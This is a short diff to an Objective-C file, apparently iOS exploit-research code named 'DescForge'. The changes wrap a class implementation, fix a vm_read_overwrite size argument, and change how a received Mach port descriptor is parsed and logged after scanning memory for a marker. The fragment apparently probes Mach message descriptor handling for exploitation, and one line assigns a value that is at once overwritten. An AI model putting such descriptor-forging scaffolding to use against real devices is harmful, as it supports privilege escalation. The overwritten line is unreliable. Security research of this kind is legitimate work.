@@ -87,6 +87,9 @@ static NSString *P113Ret(void) {
     NSString *t = [NSString stringWithContentsOfFile:p encoding:NSUTF8StringEncoding error:nil];
     return t ?: @"p113: empty";
 }
+
+@implementation P113DescForgeControl
+
 + (NSString *)tap {
     NSString *docs = [NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES) firstObject];
     p113_fd = open([[docs stringByAppendingPathComponent:@"p113_descforge_log.txt"] fileSystemRepresentation],
@@ -112,8 +115,9 @@ static NSString *P113Ret(void) {
         uint8_t *rb = malloc(0x4000);
         for (uint64_t q = 0; q < win && !found; q += 0x4000) {
             uint64_t a = band + q; uint64_t got = 0;
+            vm_size_t vsz = 0x4000;
             kern_return_t vr = vm_read_overwrite(mach_task_self(), (vm_address_t)(uintptr_t)a,
-                0x4000, (vm_address_t)(uintptr_t)rb, &got);
+                0x4000, (vm_address_t)(uintptr_t)rb, &vsz);
             if (vr != KERN_SUCCESS) continue;
             for (uint32_t i = 0; i + 16 <= 0x4000; i += 4)
                 if (memcmp(rb + i, "P133M", 5) == 0) { found = a + i - 8 - (5 + 8 - 12 * 0); found = a + i; break; }
@@ -154,7 +158,7 @@ static NSString *P113Ret(void) {
     p113_log(@"recv kr=%u size=%u", kr, rh->msgh_size);
     if (kr == 0) {
         mach_msg_body_t *rb2 = (mach_msg_body_t *)(rbuf + sizeof(mach_msg_header_t));
-        mach_msg_ool_port_descriptor_t *d0r = (mach_msg_ool_port_descriptor_t *)(rbuf + sizeof(mach_msg_header_t) + sizeof(mach_msg_body_t));
+        mach_msg_port_descriptor_t *d0r = (mach_msg_port_descriptor_t *)(rbuf + sizeof(mach_msg_header_t) + sizeof(mach_msg_body_t));
         p113_log(@"[+] RECV OK count=%u desc0: {name=%#x pad=%#x disp=%#x type=%#x}",
                  rb2->msgh_descriptor_count, *(uint32_t *)d0r, d0r->pad1, d0r->disposition, d0r->type);
         p113_log(d0r->type == 1
@@ -164,4 +168,4 @@ static NSString *P113Ret(void) {
     return P113Ret();
 }
 
-
+@end
